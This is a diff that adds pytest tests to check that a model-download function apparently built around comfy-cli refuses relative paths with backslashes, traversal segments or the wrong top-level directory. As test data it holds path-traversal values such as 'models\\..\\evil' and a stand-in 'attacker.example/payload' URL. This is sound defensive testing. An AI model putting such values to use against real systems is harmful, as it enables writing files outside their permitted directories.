@@ -20,6 +20,7 @@ import json
 import subprocess
 import threading
 import time
+from pathlib import PurePosixPath
 
 import pytest
 from conftest import _OK_STREAM, _FakeProc, _RecordingCtx, envelope
@@ -864,6 +865,82 @@ def test_download_model_forwards_models_relative_path_unchanged(good_path, patch
 
     cmd = calls[0]["cmd"]
     assert cmd[cmd.index("--relative-path") + 1] == good_path
+
+
+@pytest.mark.parametrize(
+    "bad_path",
+    [
+        "models\\loras",  # the case below, as a plain parametrization
+        "models\\checkpoints\\sdxl",
+        "models\\",  # trailing separator, still a `\`
+        "models/loras\\ckpt",  # mixed spelling
+    ],
+)
+def test_download_model_rejects_backslash_relative_path(bad_path, patched_run):
+    """A `\\` separator is refused even when every segment is otherwise legal.
+
+    The guard splits on `\\` to decide, but comfy-cli receives the value verbatim
+    — so on a POSIX host the two disagree and the write misses the models tree
+    (see the named pin below). `/` reaches the same directory on Windows, so this
+    costs a spelling, not a destination.
+    """
+    calls = patched_run(envelope(data={}))
+
+    with pytest.raises(server.ComfyCliError, match=r"invalid relative_path.*separator"):
+        server.download_model("https://hf.co/x.safetensors", relative_path=bad_path)
+
+    assert calls == []
+
+
+def test_download_model_rejects_backslash_escaping_models_tree(patched_run):
+    """Named regression pin for what the `\\` rejection actually prevents.
+
+    `models\\loras` splits to segments `models` + `loras`, so the first-segment
+    check passes it — but pathlib on a POSIX host reads the backslash as an
+    ordinary character, making `<workspace>/models\\loras` a top-level directory
+    SIBLING of the models dir rather than a folder inside it. The write would land
+    outside the tree the guard claims to confine it to.
+    """
+    calls = patched_run(envelope(data={}))
+
+    # Pin the mechanism, so this test fails loudly if pathlib ever changes: the
+    # backslash is one literal path component, not a separator, off POSIX.
+    assert (PurePosixPath("/ws") / "models\\loras").parts == (
+        "/",
+        "ws",
+        "models\\loras",
+    )
+
+    with pytest.raises(server.ComfyCliError, match="invalid relative_path"):
+        server.download_model(
+            "https://attacker.example/payload", relative_path="models\\loras"
+        )
+
+    assert calls == []
+
+
+@pytest.mark.parametrize(
+    ("bad_path", "expected"),
+    [
+        # Ordering pin: the `\` check runs LAST, so the security-meaningful
+        # diagnoses keep their own (more specific) message.
+        ("models\\..\\evil", "traversal"),  # `\`-split makes `..` a real segment
+        ("\\evil", "traversal"),  # root-relative: an empty leading segment
+        ("custom_nodes\\pwn", "must be the models dir"),  # wrong tree first
+        ("loras\\x", "must be the models dir"),
+    ],
+)
+def test_download_model_backslash_check_is_ordered_last(
+    bad_path, expected, patched_run
+):
+    """A `\\` value that is ALSO a traversal or a wrong-tree value reports as that,
+    not as a separator-spelling complaint."""
+    calls = patched_run(envelope(data={}))
+
+    with pytest.raises(server.ComfyCliError, match=expected):
+        server.download_model("https://hf.co/x.safetensors", relative_path=bad_path)
+
+    assert calls == []
 
 
 @pytest.mark.parametrize("bad_name", [".. ", "...", ". ", "... ", " "])
